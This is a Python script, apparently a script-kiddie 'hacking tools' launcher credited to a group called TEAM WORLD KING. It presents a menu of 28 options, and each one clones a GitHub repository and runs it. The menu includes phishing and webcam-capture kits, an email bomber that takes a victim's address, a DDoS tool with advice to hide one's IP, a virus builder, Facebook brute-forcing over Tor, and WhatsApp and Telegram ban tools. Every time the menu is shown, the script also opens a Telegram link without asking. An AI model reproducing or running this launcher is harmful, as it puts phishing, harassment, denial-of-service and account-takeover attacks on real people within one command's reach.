#_____SEND BY > HACKER JADOON
#____ TELIGERM : TEAM WORLD KING
import os
import subprocess
import sys
import time
import shutil


BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TOOLS_DIR = os.path.join(BASE_DIR, "Tools")


def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')


def goto_base():
    os.chdir(BASE_DIR)
    os.makedirs(TOOLS_DIR, exist_ok=True)


def run_command(cmd, cwd=None):
    subprocess.run(cmd, shell=True, cwd=cwd)


def print_header():
    clear_screen()
    os.system(" xdg-open https://t.me/PRIVATEWEBSCRIPT3 ")
    print('''\033[31;40;1m 

█░█ █▀▀ █░ █░ █▀█ █
█▀█ ██▄ █▄ █▄ █▄█ ▄

▀█▀ █░█ █ █▀░█ █▀
░█░ █▀█ █ ▄█░█ ▄█

█▀ █▀█ █▄█ █▀█ ▀█▀ █▀█
█▄ █▀▄ ░█░ █▀▀ ░█░ █▄█

█░ █▀█ █▀█ █▀▄░▄▀█ █░ █░
█▄ █▄█ █▀▄ █▄▀░█▀█ █▄ █▄

█ █▄░█░░█▀█ █▄░█ █▀▀
█ █░▀█░░█▄█ █░▀█ ██▄

▀█▀ █▀█ █▀█ █░ █▀ 🛠
░█░ █▄█ █▄█ █▄ ▄█ 🛠v2.0
  All Hack by TEAM WORLD KING
  DECODOR : HACKER JADOON
\033[33;4mVersion:\033[0m 2.0            \033[33;4mCTRL+C:\033[0m exit          \033[33;4mAuthor:\033[0m KGF CYBER TEAM
🔥 

\033[37m[1]\033[36m Requirements & Updates        \033[37m[2]\033[36m Phishing Tool				
\033[37m[3]\033[36m WebCam Hack                   \033[37m[4]\033[36m Subscan			
\033[37m[5]\033[36m Gmail Bomber		  \033[37m[6]\033[36m DDOS Attack			
\033[37m[7]\033[36m How to use?	          \033[37m[8]\033[36m Uninstall downloaded programs		
\033[37m[9]\033[36m Ip Info	                  \033[37m[10]\033[36m dorks-eye
\033[37m[11]\033[36m HackerPro                    \033[37m[12]\033[36m RED_HAWK
\033[37m[13]\033[36m VirusCrafter                 \033[37m[14]\033[36m Info-Site
\033[37m[15]\033[36m BadMod	                  \033[37m[16]\033[36m Facebash
\033[37m[17]\033[36m DARKARMY                     \033[37m[18]\033[36m AUTO-IP-CHANGER
\033[37m[19]\033[36m SQLmap                       \033[37m[20]\033[36m Nmap
\033[37m[21]\033[36m Hydra                        \033[37m[22]\033[36m Sherlock
\033[37m[23]\033[36m ReconSpider                  \033[37m[24]\033[36m PhoneInfoga
\033[37m[25]\033[36m Email Hack                   \033[37m[26]\033[36m TikTok Hack
\033[37m[27]\033[36m WhatsApp Ban                 \033[37m[28]\033[36m Telegram Ban
''')


def option1():
    print("\033[47;31;5m Installing updates and requirements...\033[0m")
    time.sleep(5)
    run_command("pkg install git -y")
    run_command("pkg install python python3 -y")
    run_command("pkg install pip pip3 -y")
    run_command("pkg install curl -y")
    run_command("apt update")
    run_command("apt upgrade -y")
    clear_screen()
    print("\033[47;3;35m Update completed...\033[0m")
    time.sleep(3)
    main()


def option2():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    goto_base()
    os.chdir(TOOLS_DIR)
    run_command("git clone https://github.com/htr-tech/zphisher")
    os.chdir("zphisher")
    run_command("bash zphisher.sh")


def option3():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    goto_base()
    os.chdir(TOOLS_DIR)
    run_command("git clone https://github.com/techchipnet/CamPhish")
    os.chdir("CamPhish")
    run_command("bash camphish.sh")


def option4():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    goto_base()
    os.chdir(TOOLS_DIR)
    run_command("git clone https://github.com/zidansec/subscan")
    os.chdir("subscan")
    sc = input("Enter a domain e.g. (example.com): ")
    run_command(f"./subscan {sc}")


def option5():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    goto_base()
    os.chdir(TOOLS_DIR)
    run_command("git clone https://github.com/juzeon/fast-mail-bomber.git")
    os.chdir("fast-mail-bomber")
    os.rename("config.example.php", "config.php")
    run_command("php index.php update-providers")
    if os.path.exists("data/nodes.json"):
        os.remove("data/nodes.json")
    if os.path.exists("data/dead_providers.json"):
        os.remove("data/dead_providers.json")
    print("\033[47;3;35m This installation will take a long time\033[0m")
    print("\033[47;3;35m Press Ctrl+C to stop\033[0m")
    time.sleep(4)
    run_command("php index.php update-nodes")
    run_command("php index.php refine-nodes")
    print("-------------------------")
    mail = input("Enter an email address to bomb: ")
    print("-------------------------")
    run_command(f"php index.php start-bombing {mail}")


def option6():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    goto_base()
    os.chdir(TOOLS_DIR)
    run_command("git clone https://github.com/palahsu/DDoS-Ripper.git")
    os.chdir("DDoS-Ripper")
    run_command("python3 DRipper.py")
    print("")
    print("\033[47;3;35m Before using, hide your IP\033[0m")


def option7():
    clear_screen()
    print("Youtube Video: https://www.youtube.com/watch?v=zgdq6ErscqY")
    run_command("python3 -m webbrowser https://www.youtube.com/watch?v=zgdq6ErscqY")
    time.sleep(10)
    print("Wait 10 seconds")
    main()


def option8():
    clear_screen()
    print("\033[47;3;35m REMOVING DOWNLOADED PROGRAMS...\033[0m")
    time.sleep(3)
    goto_base()
    if os.path.exists(TOOLS_DIR):
        shutil.rmtree(TOOLS_DIR)
    main()


def option9():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    goto_base()
    os.chdir(TOOLS_DIR)
    run_command("apt update")
    run_command("apt install git curl -y")
    run_command("git clone https://github.com/htr-tech/track-ip.git")
    os.chdir("track-ip")
    run_command("bash trackip")


def option10():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    goto_base()
    os.chdir(TOOLS_DIR)
    run_command("git clone https://github.com/BullsEye0/dorks-eye.git")
    os.chdir("dorks-eye")
    run_command("pip install -r requirements.txt")
    run_command("python3 dorks-eye.py")


def option11():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    goto_base()
    os.chdir(TOOLS_DIR)
    run_command("apt update")
    run_command("apt upgrade -y")
    run_command("apt install git -y")
    run_command("apt install python2 -y")
    run_command("git clone https://github.com/jaykali/hackerpro.git")
    os.chdir("hackerpro")
    run_command("sudo bash install.sh")
    run_command("python2 hackerpro.py")


def option12():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    goto_base()
    os.chdir(TOOLS_DIR)
    run_command("git clone https://github.com/Tuhinshubhra/RED_HAWK")
    os.chdir("RED_HAWK")
    run_command("php rhawk.php")


def option13():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    goto_base()
    os.chdir(TOOLS_DIR)
    run_command("git clone https://github.com/Devil-Tigers/TigerVirus")
    run_command("apt update")
    run_command("apt upgrade -y")
    run_command("pkg install git -y")
    os.chdir("TigerVirus")
    run_command("bash app.sh")


def option14():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    goto_base()
    os.chdir(TOOLS_DIR)
    run_command("pkg install curl -y")
    run_command("upgrade -y")
    run_command("pkg install git -y")
    run_command("git clone https://github.com/king-hacking/info-site.git")
    os.chdir("info-site")
    run_command("bash info.sh")


def option15():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    goto_base()
    os.chdir(TOOLS_DIR)
    run_command("sudo apt-get update")
    run_command("sudo apt-get install php -y")
    run_command("sudo apt-get install php-curl -y")
    run_command("git clone https://github.com/MrSqar-Ye/BadMod.git")
    os.chdir("BadMod")
    os.chmod("INSTALL", 0o755)
    os.chmod("BadMod.php", 0o755)
    run_command("sudo php BadMod.php")


def option16():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    goto_base()
    os.chdir(TOOLS_DIR)
    run_command("git clone https://github.com/fu8uk1/facebash")
    os.chdir("facebash")
    run_command("bash install.sh")
    os.chmod("facebash.sh", 0o755)
    subprocess.Popen(["tor"])
    run_command("sudo ./facebash.sh")


def option17():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    goto_base()
    os.chdir(TOOLS_DIR)
    run_command("pkg install git -y")
    run_command("pkg install python2 -y")
    run_command("apt install git -y")
    run_command("apt install python2 -y")
    run_command("git clone https://github.com/D4RK-4RMY/DARKARMY")
    os.chdir("DARKARMY")
    os.chmod("darkarmy.py", 0o755)
    run_command("python2 darkarmy.py")


def option18():
    print("\033[47;3;35m Installation may take some time\033[0m")
    print("\033[47;3;35m This tool requires you to be (ROOT)\033[0m")
    time.sleep(3)
    goto_base()
    os.chdir(TOOLS_DIR)
    run_command("sudo apt-get install tor -y")
    run_command("pip3 install requests")
    run_command("git clone https://github.com/FDX100/Auto_Tor_IP_changer.git")
    os.chdir("Auto_Tor_IP_changer")
    print("\033[47;3;35m go to your browser / change proxy (sock proxy) to 127.0.0.1:9050\033[0m")
    time.sleep(8)
    run_command("python3 install.py")
    run_command("aut")


def option19():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    goto_base()
    os.chdir(TOOLS_DIR)
    run_command("git clone https://github.com/sqlmapproject/sqlmap.git")
    os.chdir("sqlmap")
    run_command("python3 sqlmap.py")


def option20():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    goto_base()
    os.chdir(TOOLS_DIR)
    run_command("pkg install nmap -y")
    run_command("nmap")


def option21():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    goto_base()
    os.chdir(TOOLS_DIR)
    run_command("pkg install hydra -y")
    run_command("hydra")


def option22():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    goto_base()
    os.chdir(TOOLS_DIR)
    run_command("git clone https://github.com/sherlock-project/sherlock.git")
    os.chdir("sherlock")
    run_command("python3 -m pip install -r requirements.txt")
    run_command("python3 sherlock.py")


def option23():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    goto_base()
    os.chdir(TOOLS_DIR)
    run_command("git clone https://github.com/bhavsec/reconspider.git")
    os.chdir("reconspider")
    run_command("python3 -m pip install -r requirements.txt")
    run_command("python3 reconspider.py")


def option24():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    goto_base()
    os.chdir(TOOLS_DIR)
    run_command("git clone https://github.com/sundowndev/phoneinfoga.git")
    os.chdir("phoneinfoga")
    run_command("go build -o phoneinfoga .")
    run_command("./phoneinfoga")


def option25():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    goto_base()
    os.chdir(TOOLS_DIR)
    run_command("git clone https://github.com/rooted-cyber/email-hack")
    os.chdir("email-hack")
    run_command("bash email-hack.sh")


def option26():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    goto_base()
    os.chdir(TOOLS_DIR)
    run_command("git clone https://github.com/Cyb0r9/TikTok-Hack")
    os.chdir("TikTok-Hack")
    run_command("python3 main.py")


def option27():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    goto_base()
    os.chdir(TOOLS_DIR)
    run_command("git clone https://github.com/R3DHULK/whatsapp-bomber")
    os.chdir("whatsapp-bomber")
    run_command("pip3 install -r requirements.txt")
    run_command("python3 whatsapp.py")


def option28():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    goto_base()
    os.chdir(TOOLS_DIR)
    run_command("git clone https://github.com/azkadev/telegram-ban")
    os.chdir("telegram-ban")
    run_command("php ban.php")


def main():
    goto_base()
    print_header()
    try:
        islem = input("Enter Any Attacking Options number: ")
        islem_int = int(islem) if islem.isdigit() else None
        if islem_int == 1 or islem == '01':
            option1()
        elif islem_int == 2 or islem == '02':
            option2()
        elif islem_int == 3 or islem == '03':
            option3()
        elif islem_int == 4 or islem == '04':
            option4()
        elif islem_int == 5 or islem == '05':
            option5()
        elif islem_int == 6 or islem == '06':
            option6()
        elif islem_int == 7 or islem == '07':
            option7()
        elif islem_int == 8 or islem == '08':
            option8()
        elif islem_int == 9 or islem == '09':
            option9()
        elif islem_int == 10 or islem == '010':
            option10()
        elif islem_int == 11 or islem == '011':
            option11()
        elif islem_int == 12 or islem == '012':
            option12()
        elif islem_int == 13 or islem == '013':
            option13()
        elif islem_int == 14 or islem == '014':
            option14()
        elif islem_int == 15 or islem == '015':
            option15()
        elif islem_int == 16 or islem == '016':
            option16()
        elif islem_int == 17 or islem == '017':
            option17()
        elif islem_int == 18 or islem == '018':
            option18()
        elif islem_int == 19 or islem == '019':
            option19()
        elif islem_int == 20 or islem == '020':
            option20()
        elif islem_int == 21 or islem == '021':
            option21()
        elif islem_int == 22 or islem == '022':
            option22()
        elif islem_int == 23 or islem == '023':
            option23()
        elif islem_int == 24 or islem == '024':
            option24()
        elif islem_int == 25 or islem == '025':
            option25()
        elif islem_int == 26 or islem == '026':
            option26()
        elif islem_int == 27 or islem == '027':
            option27()
        elif islem_int == 28 or islem == '028':
            option28()
        else:
            clear_screen()
            print('\033[36;40;1m You entered wrong code')
            time.sleep(1)
            main()
    except KeyboardInterrupt:
        print("\n\nExiting...")
        sys.exit(0)
    except Exception as e:
        print(f"An error occurred: {e}")
        sys.exit(1)


if __name__ == "__main__":
    clear_screen()
    main()